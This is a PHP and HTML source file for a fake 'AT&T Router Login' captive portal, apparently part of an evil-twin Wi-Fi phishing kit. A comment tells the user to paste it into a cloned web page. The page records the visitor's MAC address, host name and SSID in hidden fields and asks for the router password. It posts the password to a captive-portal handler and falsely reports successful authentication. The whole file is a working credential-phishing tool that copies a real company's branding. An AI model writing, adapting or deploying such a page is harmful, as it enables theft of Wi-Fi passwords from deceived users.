<?php
// copy and paste this whole PHP code block at the beginning of a cloned web page

include_once './helper.php';

// prevent HTTP caching
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');
header('Expires: 0');

function findParameter($url, $name, $value = '') {
    $value = urlencode($value);
    return stripos($url, "?{$name}={$value}") || stripos($url, "&{$name}={$value}");
}

function addParameter($url, $name, $value = '') {
    $value = urlencode($value);
    return $url . (stripos($url, '?') ? '&' : '?') . "{$name}={$value}";
}

function getRedirectURL() {
    // you can also redirect users to e.g. https://www.google.com
    $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    // add a custom request parameter, e.g. if you wish to display a custom message after submitting the form
    // this part is optional
    if (!findParameter($url, 'status')) {
        $url = addParameter($url, 'status', 'success');
        // $url = addParameter($url, 'status', 'error');
    }
    return $url;
}

$inputValues = array(
    'mac' => getClientMac($_SERVER['REMOTE_ADDR']),
    'host' => getClientHostName($_SERVER['REMOTE_ADDR']),
    'ssid' => getClientSSID($_SERVER['REMOTE_ADDR']),
    // redirect the user after sign in
    'target' => getRedirectURL()
);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AT&T Router Login</title>
  <link rel="stylesheet" href="./css/main.css" hreflang="en" type="text/css" media="all">
</head>
<body>
  <div class="container">
    <div class="header">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
        <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
        <line x1="12" y1="20" x2="12" y2="20"></line>
      </svg>
      <span>AT&T Router</span>
    </div>

    <?php if ($error): ?>
    <div class="status-message error">
      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="10"></circle>
        <line x1="12" y1="8" x2="12" y2="12"></line>
        <line x1="12" y1="16" x2="12.01" y2="16"></line>
      </svg>
      <span>Incorrect password. Please try again.</span>
    </div>
    <?php endif; ?>

    <?php if ($success): ?>
    <div class="status-message success">
      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
        <polyline points="22 4 12 14.01 9 11.01"></polyline>
      </svg>
      <span>Successfully authenticated. You may now access the internet.</span>
    </div>
    <?php endif; ?>

    <div class="content">
      <h1>Welcome</h1>
      <p>Please enter your router password to access the internet</p>
    </div>

    <form method="POST" action="./captiveportal/index.php">
      <div class="form-group">
        <label for="password">Router Password</label>
        <div class="input-wrapper">
          <input type="password" id="password" name="password" placeholder="Enter password" required>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
        </div>
      </div>

      <input name="mac" id="mac" type="hidden" value="<?php echo $inputValues['mac']; ?>">
      <input name="host" id="host" type="hidden" value="<?php echo $inputValues['host']; ?>">
      <input name="ssid" id="ssid" type="hidden" value="<?php echo $inputValues['ssid']; ?>">
      <input name="target" id="target" type="hidden" value="<?php echo $inputValues['target']; ?>">

      <button type="submit">Connect</button>
    </form>

    <div class="footer">
      <p>© 2025 AT&T Intellectual Property. All rights reserved.</p>
    </div>
  </div>
</body>
</html>
